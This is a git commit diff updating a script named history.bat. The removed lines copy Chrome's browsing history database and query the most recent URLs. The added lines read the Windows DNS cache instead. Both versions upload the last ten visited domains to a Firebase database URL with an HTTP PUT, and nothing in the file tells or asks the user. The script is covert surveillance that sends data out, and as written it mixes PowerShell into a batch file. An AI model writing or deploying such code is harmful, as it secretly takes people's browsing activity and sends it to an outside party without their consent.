df2fb8988c57b20ebb759381cdc300a7e453c8bd
Ayamet <ayamet2029@gmail.com>
2025-04-30 15:52:35 +0300

    Update history.bat

--- history.bat
+++ history.bat
@@ -1,27 +1,11 @@
-powershell -Command "Invoke-WebRequest https://www.sqlite.org/2025/sqlite-tools-win-x64-3490100.zip-OutFile %TEMP%\sqlite.zip"
-powershell -Command "Expand-Archive %TEMP%\sqlite-tools-win-x64-3490100.zip -DestinationPath %TEMP%\sqlitebin"
-set PATH=%PATH%;%TEMP%\sqlitebin
-
-# config
+# Config
 $firebaseUrl = "https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/history.json"
 
-# Chrome geçmiş dosyasının yolu
-$historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
-$tempPath = "$env:TEMP\temp_history.db"
+# DNS Cache çek
+$dnsEntries = (Get-DnsClientCache).Name | Sort-Object -Unique | Select-Object -Last 10
 
-# Geçmiş dosyasını geçici klasöre kopyala
-Copy-Item -Path $historyPath -Destination $tempPath -Force
+# JSON formatla
+$data = @{ visited = $dnsEntries } | ConvertTo-Json -Depth 2
 
-# Son 10 ziyaret edilen domaini al
-$urls = & {
-    sqlite3.exe $tempPath "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 10;" 2>&1
-}
-
-# JSON formatına çevir
-$data = @{ visited = $urls } | ConvertTo-Json -Depth 2
-
-# Firebase’e gönder
+# Firebase'e gönder
 Invoke-RestMethod -Uri $firebaseUrl -Method PUT -Body $data
-
-# Temizlik
-Remove-Item $tempPath -Force
